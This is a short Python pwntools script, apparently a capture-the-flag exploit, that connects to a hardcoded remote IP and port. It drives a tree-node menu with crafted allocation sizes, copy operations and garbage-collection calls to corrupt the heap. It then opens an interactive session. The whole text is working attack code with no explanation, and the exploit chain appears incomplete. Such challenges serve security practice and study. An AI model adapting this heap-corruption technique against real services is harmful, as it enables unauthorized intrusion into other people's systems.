from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
def new_node(position, dat):
  s.recvuntil('quit')
  s.sendline('0')
  s.recvuntil('?')
  s.sendline(position)
  s.recvuntil('data len?')
  s.sendline(str(len(dat)))
  s.send(dat)

def copy_node(_from, _to):
  s.recvuntil('quit')
  s.sendline('2')
  s.recvuntil('tree position? ')
  s.sendline(_from)
  s.recvuntil('tree position? ')
  s.sendline(_to)

def gc():
  s.recvuntil('quit')
  s.sendline('3')

new_node("0", "A"*0x4f)
new_node("1", "B"*(0x50+0x10+0x10+0x50-24*2))
new_node("2","ABCD")
copy_node("0","1")
gc()
new_node("1","D"*0xc0)
new_node("2","E"*0x100)
new_node("3","ABCD")
copy_node("0","1")
copy_node("0","2")
gc()
raw_input()
new_node("1","A"*(0xf0-24))
s.interactive()
